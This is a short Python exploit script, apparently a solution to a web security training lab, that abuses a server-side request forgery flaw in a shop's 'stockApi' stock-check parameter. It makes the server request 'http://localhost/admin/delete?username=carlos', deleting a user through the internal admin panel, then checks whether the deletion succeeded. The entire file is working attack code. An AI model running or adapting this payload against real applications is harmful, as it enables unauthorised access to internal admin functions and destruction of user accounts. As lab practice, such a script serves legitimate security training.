import requests
from pwn import *
import sys
import urllib3
from itertools import cycle
import logging

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'

def delete_user(url):
    delete_user_url_ssrf_payload = 'http://localhost/admin/delete?username=carlos'
    check_stock_path = 'product/stock'
    params = {'stockApi': delete_user_url_ssrf_payload}
    try:
        r = requests.post(url + check_stock_path, data=params, verify=False, proxies=proxies)
    except Exception:
        pass

    # Check if user was deleted
    print('Check if user was deleted')
    admin_ssrf_payload = 'http://localhost/admin'
    params2 = {'stockApi': admin_ssrf_payload}
    info('we trying to send a post method to: %s with params: %s' % (url + check_stock_path, params2))
    try:
        r = requests.post(url + check_stock_path, data=params2, verify=False, proxies=proxies)
    except Exception:
        pass
    if 'User deleted successfully' in r.text:
        info("(+) Successfully deleted Carlos user!")
    else:
        info("(-) Exploit was unsuccessful.")

def main():
    if len(sys.argv) != 2:
        info("(+) Usage: %s <url>" % sys.argv[0])
        info("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    info("(+) Deleting Carlos user...")
    delete_user(url)


if __name__ == "__main__":
    main()